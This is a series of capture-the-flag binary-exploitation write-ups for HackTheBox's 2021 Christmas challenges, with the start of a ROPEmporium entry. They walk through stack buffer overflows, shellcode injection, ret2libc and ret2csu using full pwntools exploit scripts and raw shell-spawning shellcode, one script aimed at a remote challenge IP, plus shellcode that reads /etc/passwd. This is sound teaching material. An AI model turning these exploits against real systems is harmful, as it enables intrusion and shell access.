<p>Sleigh was i think the second exploitation challenge of the Hackthebox Christmas 2021 event, it was a pretty great challenge, a bit easy once again but it was fun. The name of the challenge is also pretty accurate since we will need to &quot;<strong>sleigh</strong>&quot; back to a variable to execute our shellcode.</p>
<h2 id="solving-the-challenge-1"><a class="header" href="#solving-the-challenge-1">Solving The Challenge</a></h2>
<p>Okay so when running the challenge, we are asked if we wan't to <strong>repair</strong> the sleigh or <strong>abandon</strong> it. Abandoning it will cause the challenge to exit, while repair will asks us for more input.</p>
<p>When we select repair, the program leaks the address of our input, then the  program calls read and asks us for the input. The thing is, we have the address of our input, and since we read <strong>0xa4 bytes</strong> in a buffer of <strong>64 bytes</strong> we can overflow the return address, we can write some shellcode at the beginning of our input, put a little bit of padding and overwrite the return address of the current function for the address of our input, since the beginning of our input contains valid code, it should execute !</p>
<p>This challenge is great if your practicing shellcoding, you can pretty much write any kind of shellcode less than 72 bytes, put it at the beginning of your input and it should execute it.</p>
<p>As a test to see if my shellcode was working at the beginning i made the following shellcode which is just an exit syscall with a certain number, when a program exit you can usually check the exit number and therefore confirm if you were indeed able to inject code :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    # Clear Registers
    xor rdi, rdi
    # Syscall
    mov rax, 60
    mov rdi, 69
    syscall
</code></pre>
<p>To inject this code you would need to input the raw bytes of it at the beginning of your input, then put some padding with &quot;A&quot; until you reach 72 bytes, then it's time to overflow the return address, so you can just add the leaked address to your payload, and if you correctly overwritten the return address of the function it should execute your shellcode and exit with the code number 69.</p>
<p>To solve the challenge i used the following code :</p>
<pre><code class="language-py">import pwn

pwn.context.arch = &quot;amd64&quot;

local = False

if local:
    io = pwn.process(&quot;./sleigh&quot;)
else:
    io = pwn.remote(&quot;178.62.75.187&quot;, 30496)

shellcode = b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;

pwn.log.info(f&quot;Shellcode Length = {len(shellcode)}&quot;)
io.sendlineafter(b&quot;&gt; &quot;, b&quot;1&quot;)
io.recvuntil(b&quot;sleigh: &quot;)
addr = int(io.recvline().decode().strip(&quot;[&quot;).replace(&quot;]&quot;, &quot;&quot;), 16)
pwn.log.info(f&quot;Leaked Address {addr}&quot;)
payload = shellcode + (72 - len(shellcode)) * b&quot;A&quot; + pwn.p64(addr)
io.sendline(payload)
io.interactive()
</code></pre>
<p>Running this code either locally or remotely should drop you a shell, note that you can practice writing your own shellcode, but the problem with the read function is that it reads input until it encounters a new line, this means if you write shellcode for this challenge it can't contains any 0x0a opcodes, for those who study at ASU you should be pretty good evading filters on shellcode :P</p>
<h2 id="trying-different-shellcode"><a class="header" href="#trying-different-shellcode">Trying different shellcode</a></h2>
<p>So i just previously said that we can test any kind of shellcode we want with this program, as long as it does not contains any <code>0x0a</code> bytes or is smaller or equal to 72 bytes.</p>
<p>I've wrote the following shellcode which will read the /etc/passwd file, the shellcode is 72 bytes exactly so you shouldn't need any padding (shellcode -&gt; leaked address).</p>
<pre><code class="language-x86asm">.global _start
.intel_syntax noprefix

_start:
    xor esi, esi
    lea rdi, [rip+etcpasswd]
    mov rax, 2
    syscall
    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 5000
    mov rax, 40
    syscall
    mov rax, 60
    syscall

etcpasswd:
    .ascii &quot;/etc/passwd\0&quot;
</code></pre>
<p>Running the challenge with this shellcode will output the <code>/etc/passwd</code> file, which is not particularly useful but it proves that we can execute pretty much the shellcode we want.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cyber-santa-is-coming-to-town-pwn-naughty-list"><a class="header" href="#cyber-santa-is-coming-to-town-pwn-naughty-list">Cyber Santa is Coming to Town (Pwn Naughty List)</a></h1>
<p>This challenge was remarkable because it was one of the simplest and most educative <code>ret2libc</code> challenge i've done so far. It was pretty straightforward, finding the vulnerability took me a minute or two, and since they gave me a <code>libc.so.6</code> file, i knew it was ret2libc.</p>
<h2 id="preparing-the-challenge"><a class="header" href="#preparing-the-challenge">Preparing the Challenge</a></h2>
<p>Before starting the challenge you will need to make sure you have the right version of the linker and the right version of libc, usually you can check the string of the libc binary and search for a ubuntu version then you can run a docker on that right version.</p>
<pre><code>$ strings ./libc.so.6 | grep &quot;ubuntu&quot;
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
</code></pre>
<p>Looking at the output we can see that our program was compiled using <code>ubuntu version 18.04</code>, you can run a docker with that specific version of ubuntu using the following command.</p>
<pre><code>$ docker run -it ubuntu:18.04
root@1e005e022242:/#
</code></pre>
<p>But for this challenge we will use <code>pwninit</code>, so i don't have to set up a whole docker environment, as you have probably noticed docker doesn't come with any useful binaries for exploitation, using my main machine will be way much simpler. So you can start by getting <code>pwninit</code> using the following command.</p>
<pre><code>$ cargo install pwninit
</code></pre>
<p>Then you can run pwninit in the directory of the vulnerable binary.</p>
<pre><code>$ pwninit
bin: ./naughty_list
libc: ./libc.so.6
ld: ./ld-2.27.so

copying ./naughty_list to ./naughty_list_patched
running patchelf on ./naughty_list_patched
</code></pre>
<p>You can either used the binary <code>pwninit</code> generated or patched the binary on your own, you would usually do this with the <code>patchelf</code> utility.</p>
<pre><code>$ patchelf --set-interpreter ./ld-2.27.so --replace-needed libc.so.6 /challenge/pwn_naughty_list/libc.so.6 ./naughty_list
</code></pre>
<p>Then you should now be able to run your binary with the right linker and libc versions ! You can verify this by using <code>ldd</code> on your binary.</p>
<pre><code>$ ldd ./naughty_list
        linux-vdso.so.1 (0x00007ffee7b73000)
        /challenge/pwn_naughty_list/libc.so.6 (0x00007f1c32b1f000)
       ./ld-2.27.so =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f1c32f17000)
</code></pre>
<p>We can confirm that our  challenge use the right linker and the right libc versions.</p>
<h2 id="solving-the-challenge-2"><a class="header" href="#solving-the-challenge-2">Solving the Challenge</a></h2>
<p>Solving this challenge will be a little longer than the previous writeups i've did so far since ret2libc is a little more complicated. So without hesitating let's solve this challenge.</p>
<p>First thing i will do is find the vulnerable point in the program, i suggest you open the binary in ghidra for that, or you can go in fully 1337 mode and use only gdb. (disassemblers exist for a good reason tho).</p>
<p>Looking at the main function we can see 4 different functions that asks for our input.
<img src="https://i.imgur.com/cgUkVpv.png" alt="Potentially Vulnerable Functions" /></p>
<p>Looking deeper into each of these functions we notice that the functions <code>get_name, get_surname, get_age</code>. However we do not have any restrictions on our last function <code>get_descr</code>.
<img src="https://i.imgur.com/GRBbFVq.png" alt="No Restrictions on get_descr input" /></p>
<p>We can also see in the screenshot that we read <code>0x3c0 bytes (960)</code> of input inside a buffer of <code>32 bytes</code> which is clearly vulnerable to a buffer overflow.</p>
<p>We can try to make our binary <code>SEGFAULT</code> by running it and sending a little more than ~32 bytes of input, let's try this in practice</p>
<pre><code>$ ./naughty_list

~ Ho Ho Ho Santa is here ~

       _______________
    0==( Naughty List (c==0
       '______________'|
         | Name        |
         | Gift        |
       __)_____________|
   0==(               (c==0
       '--------------'

[*] Enter your name    (letters only): penis
[*] Enter your surname (letters only): penis
[*] Enter your age (18-120): 69
[+] Name:    [PENIS]
[+] Surname: [PENIS]
[+] Age:     [69]

[*] Name of the gift you want and why you were good enough to deserve it: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[*] 🎅 will take a better look and hopefuly you will get your 🎁!
[1]    3876 segmentation fault (core dumped)  ./naughty_list
</code></pre>
<p>Running a cyclic string with our binary in gdb reveals that we overwrite our return address after <code>40 bytes of input</code>. We can start writing our exploit the following way.</p>
<pre><code class="language-py">import pwn

e = pwn.ELF(&quot;./naughty_list&quot;)
libc = pwn.ELF(&quot;libc.so.6&quot;)
io = pwn.process(e.path)
pwn.context.arch = &quot;amd64&quot;
PADDING = 40
</code></pre>
<p>Now the second step in a ret2libc attack is to leak the address of a functions in the .got section, this should be pretty simple to do.</p>
<p>Let's start by finding a <code>pop_rdi; ret</code> instruction using ropper, so we can align our stack before starting to do a <code>ropchain</code>.</p>
<pre><code>$ ropper -- --search &quot;pop rdi; ret&quot; --file ./naughty_list
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./naughty_list
0x0000000000401443: pop rdi; ret;
</code></pre>
<p>We see that at address <code>0x0000000000401443</code>, we have the <code>pop rdi; ret</code> instruction. We can take that value and add it into our python script.</p>
<pre><code class="language-py">pop_rdi = pwn.p64(0x0000000000401443)
</code></pre>
<p>Sometimes using <code>ret</code> instead of <code>pop rdi; ret</code> is a better idea, since it's totally doable you can search for a <code>ret</code> instruction in the binary and you can add it the same way we just did with <code>pop_rdi</code>.</p>
<p>Next thing we need to do is to find a function we want to leak the address of, so what i did was open <code>bpython or python</code>, and you can do the following to see the different functions available in the <code>.got</code> section.</p>
<pre><code>&gt;&gt;&gt; import pwn
&gt;&gt;&gt; e = pwn.ELF(&quot;./naughty_list&quot;)
[*] '/challenge/pwn_naughty_list/naughty_list'
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x3ff000)
&gt;&gt;&gt; e.got
{'__libc_start_main': 6299632, '__gmon_start__': 6299640, 'stdout': 6299744, 'stdin': 6299760, 'toupper': 6299520, '
puts': 6299528, 'strlen': 6299536, 'printf': 6299544, 'memset': 6299552, 'alarm': 6299560, 'read': 6299568, 'srand':
6299576, 'strcmp': 6299584, 'time': 6299592, 'setvbuf': 6299600, '__isoc99_scanf': 6299608, 'fwrite': 6299616, 'ran
d': 6299624}
</code></pre>
<p>We can notice a few functions we can leak, but for this challenge we will simply use <code>puts</code>, so we can continue our script the following way.</p>
<pre><code class="language-py">puts_at_got = pwn.p64(e.got.puts)
</code></pre>
<p>And since we want to leak the address of that function we need to get the address of <code>puts</code> in the <code>plt</code> section, this will cause <code>puts</code> to be called with the address of <code>puts_at_got</code> as argument (the address of puts in libc), therefore leaking the address on the screen, we can use pwntools to receive the line and to unpack the value. You can add thefollowing to your script.</p>
<pre><code class="language-py">puts_at_plt = pwn.p64(e.plt.puts)
</code></pre>
<p>Okay so now we can see if our script is able to leak the address of puts on the screen, your script should look like the following.</p>
<pre><code class="language-py">import pwn

e = pwn.ELF(&quot;./naughty_list&quot;)
libc = pwn.ELF(&quot;libc.so.6&quot;)
io = pwn.process(e.path)
pwn.context.arch = &quot;amd64&quot;
PADDING = 40

pop_rdi = pwn.p64(0x0000000000401443)
ret = pwn.p64(0x0000000000400756)
puts_at_got = pwn.p64(e.got.puts)
puts_at_plt = pwn.p64(e.plt.puts)

payload = [
    b&quot;A&quot;*PADDING,
    pop_rdi,
    puts_at_got
    puts_at_plt
]

io.sendlineafter(b&quot;:&quot;, &quot;PENIS&quot;)
io.sendlineafter(b&quot;:&quot;, &quot;PENIS&quot;)
io.sendlineafter(b&quot;:&quot;, &quot;69&quot;)

io.sendlineafter(b&quot;:&quot;, b&quot;&quot;.join(payload))

io.interactive()
</code></pre>
<p>Running the python script confirms that it indeed leaks the address of the puts function.</p>
<pre><code>python3 leak.py
[+] Starting local process '/challenge/pwn_naughty_list/naughty_list': pid 4512
[*] Switching to interactive mode
    [PENIS]
[+] Surname: [PENIS]
[+] Age:     [69]

[*] Name of the gift you want and why you were good enough to deserve it:
[*] 🎅 will take a better look and hopefuly you will get your 🎁!
\xa0\xfa\xed3
[*] Got EOF while reading in interactive
</code></pre>
<p>Leaking the function is cool, but the program directly ends after that since our program don't have any valid instruction to execute, for this reason if we want to exploit the program we will need to make a jump into the vulnerable function <code>get_descr</code>. So we're going to add the address of the <code>get_descr</code> function after our call to puts in the plt.</p>
<pre><code class="language-py">get_descr = pwn.p64(e.symbols.get_descr)
</code></pre>
<p>Don't forget to add the line in the payload field after <code>puts_at_plt</code>.</p>
<pre><code class="language-py">payload = [
    b&quot;A&quot;*PADDING,
    pop_rdi,
    puts_at_got,
    puts_at_plt,
    get_descr
]
</code></pre>
<p>You can rerun the program, and see that after leaking the address, it jump backs to our vulnerable function.</p>
<pre><code>python3 leak.py
[+] Starting local process '/challenge/pwn_naughty_list/naughty_list': pid 4567
[*] Switching to interactive mode
    [PENIS]
[+] Surname: [PENIS]
[+] Age:     [69]

[*] Name of the gift you want and why you were good enough to deserve it:
[*] 🎅 will take a better look and hopefuly you will get your 🎁!
\xa0z֗\xd5

[*] Name of the gift you want and why you were good enough to deserve it: $ test
[*] 🎅 will take a better look and hopefuly you will get your 🎁!
</code></pre>
<p>Notice how the program asks us a second time for the same vulnerable input, this means we successfully were able to jump back inside our vulnerable function.</p>
<p>Now we need our program to parse the leaked function address, for this we will need to do some trial and error with <code>recvline</code> until we have the right number of lines. After testing i know that i need to skip 6 lines before it leaks our input so you can add the following to your script.</p>
<pre><code>io.recvlines(6)
leak = pwn.unpack(io.recvline()[:6].ljust(8, b&quot;\x00&quot;))
pwn.log.info(f&quot;Leaked address {hex(leak)}&quot;)
</code></pre>
<p>Running our script now shows that we indeed leak the <code>puts</code> function address properly, and that we were able to store it in a variable called <code>leak</code>.</p>
<p>Now to calculate the <code>libc base address</code>, we can substract the offset of the <code>puts</code> function in libc to the address of <code>puts</code> we leaked, this should give us the base address. To find an offset we are going to use the readelf utility.</p>
<pre><code>readelf -s ./libc.so.6 | grep GLIBC | grep puts
   191: 0000000000080aa0   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
   422: 0000000000080aa0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
   496: 0000000000126550  1240 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
   678: 0000000000128460   750 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
   1141: 000000000007f2d0   396 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
</code></pre>
<p>We see that the <code>puts</code> function as an offset of <code>0000000000080aa0</code> in <code>libc</code>, let's add the following to our script.</p>
<pre><code class="language-py">puts_libc_offset = 0x0000000000080aa0
libc.address = leak - puts_libc_offset
pwn.log.info(f&quot;Base address of libc : {hex(libc.address)}&quot;)
</code></pre>
<p>Next we can create a <code>ROP</code> object and exploit the program using a call to <code>system(&quot;/bin/sh&quot;)</code>, this is pretty simple to do. Add the following to your script. <em>Note that for an obscure reason, the pop_rdi didn't worked with the second payload, so i used a single ret instead and it worked well</em></p>
<pre><code class="language-py">rop = pwn.ROP(libc)
rop.system(next(libc.search(b&quot;/bin/sh\x00&quot;)))
io.sendline(pwn.flat({PADDING: [ret, rop.chain()]}))
</code></pre>
<p>You should have now the following code in your script.</p>
<pre><code class="language-py">import pwn

e = pwn.ELF(&quot;./naughty_list&quot;, checksec=False)
libc = pwn.ELF(&quot;libc.so.6&quot;, checksec=False)
io = pwn.process(e.path)
pwn.context.arch = &quot;amd64&quot;
PADDING = 40

pop_rdi = pwn.p64(0x0000000000401443)
ret = pwn.p64(0x0000000000400756)
puts_at_got = pwn.p64(e.got.puts)
puts_at_plt = pwn.p64(e.plt.puts)
get_descr = pwn.p64(e.symbols.get_descr)

payload = [
    b&quot;A&quot;*PADDING,
    pop_rdi,
    puts_at_got,
    puts_at_plt,
    get_descr
]

io.sendlineafter(b&quot;:&quot;, b&quot;PENIS&quot;)
io.sendlineafter(b&quot;:&quot;, b&quot;PENIS&quot;)
io.sendlineafter(b&quot;:&quot;, b&quot;69&quot;)
io.sendlineafter(b&quot;:&quot;, b&quot;&quot;.join(payload))

io.recvlines(6)
leak = pwn.unpack(io.recvline()[:6].ljust(8, b&quot;\x00&quot;))
pwn.log.info(f&quot;Leaked address {hex(leak)}&quot;)

puts_libc_offset = 0x080aa0
libc.address = leak - puts_libc_offset
pwn.log.info(f&quot;Base address of libc : {hex(libc.address)}&quot;)

rop = pwn.ROP(libc)
rop.system(next(libc.search(b&quot;/bin/sh\x00&quot;)))
io.sendlineafter(b&quot;:&quot;, pwn.flat({PADDING: [ret, rop.chain()]}))
io.interactive()
</code></pre>
<p>Running it either locally or remotely on a vulnerable machine drops us a shell, you can read the flag in the flag.txt file ! Hopefully you enjoyed the challenge and the writeup.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cyber-santa-is-coming-to-town-minimelfistic"><a class="header" href="#cyber-santa-is-coming-to-town-minimelfistic">Cyber Santa is Coming to Town (Minimelfistic)</a></h1>
<p>Minimelfistic is i think the 4th challenge of the pwn category of the 2021 event Cyber Santa is Coming to Town from HackTheBox.</p>
<p>The challenge was relatively simple, it was a super simple ret2csu exploitation challenge, which could be done by pretty much anyone who has basic knowledge on assembly and exploitation.</p>
<h2 id="patch-the-alarms"><a class="header" href="#patch-the-alarms">Patch the Alarms</a></h2>
<p>So if you have looked a bit inside the binary in a disassembler, you can see that inside the function <code>setup()</code> there is a call to _alarm which will cause the program to have a timeout, which i kinda hate when debugging.</p>
<p>So before trying to find any vulnerability i will open the binary inside IDA and perform a small program patch so we can skip the call to alarm and therefore we will don't get a time limit to debug the binary.</p>
<p><img src="https://i.imgur.com/J9kqf1i.png" alt="" /></p>
<p>As you can see in the picture, we replace 2 instructions by a bunch of nops and we kept pop rbp and retn.</p>
<p><em>Don't forget to save and apply patch to the binary before leaving IDA</em>.</p>
<h2 id="finding-a-vulnerability"><a class="header" href="#finding-a-vulnerability">Finding a vulnerability</a></h2>
<p>Finding the vulnerability in this program is quite simple, since all the program logic is located in the main function.</p>
<p>Open your favorite decompiler or disassembler (disassemblers make much more sense in exploitation) and let's try to find this vulnerability.</p>
<p><img src="https://i.imgur.com/36UzCuR.png" alt="" /></p>
<p>We can see <strong>highlighted in greed</strong> our main infinite loop which in this case contains the vulnerable part of our program, <strong>highlighted in red</strong> is the vulnerable part and <strong>highlighted in light blue</strong> shows that if our input starts with <code>9</code> we will hit the <code>return 0</code> at the end of our program which will overwrite the return address.</p>
<p><em>Note that if our string does not start with 9, the buffer overflow won't &quot;trigger&quot;.</em></p>
<h2 id="finding-the-return-address-offset-on-the-stack"><a class="header" href="#finding-the-return-address-offset-on-the-stack">Finding the return address offset on the stack</a></h2>
<p>Next step is to find where exactly does we start overwriting the return address, for this we'll use a cyclic pattern.</p>
<p>Fire up GDB and run your program inside it, it will ask you for an input, in our case you will need to put a &quot;9&quot; before the cyclic pattern</p>
<pre><code>pwndbg&gt; cyclic 120
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua  
aavaaawaaaxaaayaaazaabbaabcaabdaabeaab

pwndbg&gt; r
  
[*] Santa is not home!  
  
[*] Santa is not home!  
  
[!] Santa returned!  
  
[*] Hello ! Do you want to turn off the ? (y/n)  
&gt; 9aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua  
aavaaawaaaxaaayaaazaabbaabcaabdaabeaab

────────────────────────────────────[ DISASM ]────────────────────────────────────  
► 0x4009dc &lt;main+259&gt; ret &lt;0x6161746161617361&gt;

pwndbg&gt; cyclic -l 0x61617361
71
</code></pre>
<p>We can conclude that we need <code>72 bytes (including the &quot;9&quot;)</code>  before we hit the return address offset, so we can note this and begin writing our script.</p>
<h2 id="templating-an-exploit"><a class="header" href="#templating-an-exploit">Templating an exploit</a></h2>
<p>There is a cool python module for exploitation that generates template-ish pwntools exploit. It is pretty simple to use and i like to use it since it makes me win a lot of time, you can use it the following way.</p>
<pre><code>$ pwn template ./minimelfistic &gt; exploit.py
</code></pre>
<p>Then you can start writing your exploit inside this file, if you want to debug it you can run it with <code>GDB</code> as argument <code>e.g : python3 exploit.py GDB</code> will spawn the program inside gdb so you can step through the program.</p>
<h2 id="obtain-libc-base-address"><a class="header" href="#obtain-libc-base-address">Obtain LIBC base address</a></h2>
<p>Now we know the offset of our program, we need to leak a function from libc so we can leak the base address of libc.</p>
<p>So i headed inside Python IDLE, and i typed the following commands.</p>
<pre><code>&gt;&gt;&gt; import pwn  
&gt;&gt;&gt; e = pwn.ELF(&quot;./minimelfistic&quot;)  
[*] '/challenge/pwn_minimelfistic/minimelfistic'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x3ff000)  
&gt;&gt;&gt; e.got  
{'__libc_start_main': 6303728, '__gmon_start__': 6303736, 'stdout': 6303760, 'stdi  
n': 6303776, 'write': 6303656, 'strlen': 6303664, 'alarm': 6303672, 'read': 630368  
0, 'srand': 6303688, 'time': 6303696, 'setvbuf': 6303704, 'sleep': 6303712, 'rand'  
: 6303720}
</code></pre>
<p>Looking at the output, we see the .got table of our binary which contains address of functions that are dynamically linked.</p>
<p>We need a function that can output the flag to the screen, something like a <code>sendfile, puts or write</code>. In our case we can see that we have the <code>write</code> function available... we will use it.</p>
<p>The <code>write</code> function is a little bit harder to execute in a ROP Chain than the <code>puts</code>, since write requires 3 arguments instead of 1. This means we will need to populate <code>rdi, rsi and rdx</code> instead of just <code>rdi</code>.</p>
<p>Unfortunately there is not enough gadget to populate the <code>rdx</code> register with the value we want, so we will need to rely on another technique... RET2CSU !!!</p>
<p>When a binary is dynamically linked on linux, there is always a <code>__libc_csu_init</code> function in the binary which contains 2 useful gadgets for us.</p>
<p>The first one is a &quot;POP Slide&quot;, and the second one move a few values we just popped from the stack inside <code>edi, rsi and rdx</code>.
<img src="https://i.imgur.com/SIXfk7Q.png" alt="" /></p>
<p>In our case we want to pop the values inside <code>r15, r14 and the lower 32 bits of r13</code>, we also want to populate the <code>r12</code> register with a function pointer so we can return back into our main function (<em>note that RBX will need to be 0 else the call at <code>__libc_csu_init+73</code> won't work</em>).</p>
<h2 id="finding-a-function-pointer-somewhere-in-the--binary"><a class="header" href="#finding-a-function-pointer-somewhere-in-the--binary">Finding a function pointer somewhere in the  binary</a></h2>
<p>In ret2csu attacks it is common to use the <code>_init</code> function that is also included in most dynamically linked binaries, so i opened ghidra and looked for <code>XREFS</code> to the <code>_init</code> function and i found that at address <code>0x00602db8</code> is exactly what we want, we can populate the register with the address and it should work.</p>
<h2 id="populating-registers-for-the-_init-function"><a class="header" href="#populating-registers-for-the-_init-function">Populating registers for the _init function</a></h2>
<p>Calling into init will cause another pop slide, so in this one we will fill he popped registers with garbage data &quot;AAAAAAAA&quot;.</p>
<h2 id="writing-the-leak"><a class="header" href="#writing-the-leak">Writing the Leak</a></h2>
<p>Now we know almost everything we need we will get to coding this exploit and achieve the leak of the address of write in the got table.</p>
<pre><code class="language-py">#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./minimelfistic
from pwn import *
  
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./minimelfistic')
# context.log_level = &quot;debug&quot;
context.terminal = [&quot;konsole&quot;, &quot;-e&quot;]
# Many built-in settings can be controlled on the command-line and show up
# in &quot;args&quot;. For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
  

def start(argv=[], *a, **kw):
'''Start the exploit against the target.'''
	if args.GDB:
		return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
	else:
		return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = 'break main'
  
#===========================================================
# EXPLOIT GOES HERE
#===========================================================
# Arch: amd64-64-little
# RELRO: Full RELRO
# Stack: No canary found
# NX: NX enabled
# PIE: No PIE (0x3ff000)
  
io = start()
#io = remote(&quot;localhost&quot;, 1337)
e = ELF(&quot;./minimelfistic&quot;)
libc = ELF(&quot;./libc.so.6&quot;)
  
CRASH = b&quot;9&quot; + b&quot;A&quot;*71
  
# ROP (pop rdi; ret)
rop = ROP(e)
POP_RDI_RET = p64(rop.find_gadget([&quot;pop rdi&quot;, &quot;ret&quot;])[0])
  
# We need to call write(int fd, const void* buf, size_t count);
CSU_POP_SLIDE = p64(e.sym.__libc_csu_init+90)
CSU_MOVS = p64(e.sym.__libc_csu_init+64)
  
PAYLOAD = [
	CRASH,
	POP_RDI_RET,
	p64(1),
	CSU_POP_SLIDE,
	p64(0), # rbx
	p64(1), # rbp
	p64(0x00602db8), # r12 (else 0x400a0c, 00602db8)
	p64(1), # r13
	p64(e.got.write), # r14
	p64(8), # r15
	CSU_MOVS,
	b&quot;AAAAAAAA&quot;*7,
	p64(e.plt.write),
	p64(e.sym.main)
]

io.sendlineafter(b&quot;&gt; &quot;, b&quot;&quot;.join(PAYLOAD))
print(io.recvline())
print(io.recvline())
print(io.recvline())

WRITE_LEAK = u64(io.recv(8).ljust(8, b'\x00'))
libc.address = WRITE_LEAK - libc.sym.write

log.info(f&quot;Leaked address of write : {hex(WRITE_LEAK)}&quot;)
log.info(f&quot;Leaked address of libc : {hex(libc.address)}&quot;)

io.interactive()
</code></pre>
<p>Running this script should output the leaked address and the base address of libc, we're on the way to pwn this challenge hehe.</p>
<h2 id="spawning-a-shell"><a class="header" href="#spawning-a-shell">Spawning a Shell</a></h2>
<p>Now that we know the base address of libc we can pretty much execute what we want with the binary, but we'll stay in the challenge boundaries and go with the simplest payload i could think of.</p>
<p>You can append this part at the end of the script.</p>
<pre><code class="language-py">SHELL_PAYLOAD = [
	CRASH,
	POP_RDI_RET,
	p64(next(libc.search(b&quot;/bin/sh&quot;))),
	p64(libc.sym[&quot;system&quot;])
]

io.sendlineafter(b&quot;&gt; &quot;, b&quot;&quot;.join(SHELL_PAYLOAD))
io.interactive()
</code></pre>
<h2 id="final-script"><a class="header" href="#final-script">Final Script</a></h2>
<p>If you did the same thing as i did then your final script should look exactly or somewhat similar to the following script.</p>
<pre><code class="language-py">#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./minimelfistic
from pwn import *
  
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./minimelfistic')
# context.log_level = &quot;debug&quot;
context.terminal = [&quot;konsole&quot;, &quot;-e&quot;]
# Many built-in settings can be controlled on the command-line and show up
# in &quot;args&quot;. For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
  

def start(argv=[], *a, **kw):
'''Start the exploit against the target.'''
	if args.GDB:
		return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
	else:
		return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = 'break main'
  
#===========================================================
# EXPLOIT GOES HERE
#===========================================================
# Arch: amd64-64-little
# RELRO: Full RELRO
# Stack: No canary found
# NX: NX enabled
# PIE: No PIE (0x3ff000)
  
io = start()
#io = remote(&quot;localhost&quot;, 1337)
e = ELF(&quot;./minimelfistic&quot;)
libc = ELF(&quot;./libc.so.6&quot;)
  
CRASH = b&quot;9&quot; + b&quot;A&quot;*71
  
# ROP (pop rdi; ret)
rop = ROP(e)
POP_RDI_RET = p64(rop.find_gadget([&quot;pop rdi&quot;, &quot;ret&quot;])[0])
  
# We need to call write(int fd, const void* buf, size_t count);
CSU_POP_SLIDE = p64(e.sym.__libc_csu_init+90)
CSU_MOVS = p64(e.sym.__libc_csu_init+64)
  
PAYLOAD = [
	CRASH,
	POP_RDI_RET,
	p64(1),
	CSU_POP_SLIDE,
	p64(0), # rbx
	p64(1), # rbp
	p64(0x00602db8), # r12 (else 0x400a0c, 00602db8)
	p64(1), # r13
	p64(e.got.write), # r14
	p64(8), # r15
	CSU_MOVS,
	b&quot;AAAAAAAA&quot;*7,
	p64(e.plt.write),
	p64(e.sym.main)
]

io.sendlineafter(b&quot;&gt; &quot;, b&quot;&quot;.join(PAYLOAD))
print(io.recvline())
print(io.recvline())
print(io.recvline())

WRITE_LEAK = u64(io.recv(8).ljust(8, b'\x00'))
libc.address = WRITE_LEAK - libc.sym.write

log.info(f&quot;Leaked address of write : {hex(WRITE_LEAK)}&quot;)
log.info(f&quot;Leaked address of libc : {hex(libc.address)}&quot;)

io.interactive()

SHELL_PAYLOAD = [
	CRASH,
	POP_RDI_RET,
	p64(next(libc.search(b&quot;/bin/sh&quot;))),
	p64(libc.sym[&quot;system&quot;])
]

io.sendlineafter(b&quot;&gt; &quot;, b&quot;&quot;.join(SHELL_PAYLOAD))
io.interactive()
</code></pre>
<p>Hope you enjoyed the challenge as much as i did enjoy pwning it :)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ropemporium-split"><a class="header" href="#ropemporium-split">ROPEmporium (Split)</a></h1>
<p>Split is the second challenge of the ROPemporium series on binary exploitation, it's a pretty simple challenge that just require you to make a system call using the address of the string &quot;/bin/cat flag.txt&quot;, to find this string you can just look at the different functions the binary has and you should see one called <code>usefulString</code>, this symbol should contain the string we want.</p>
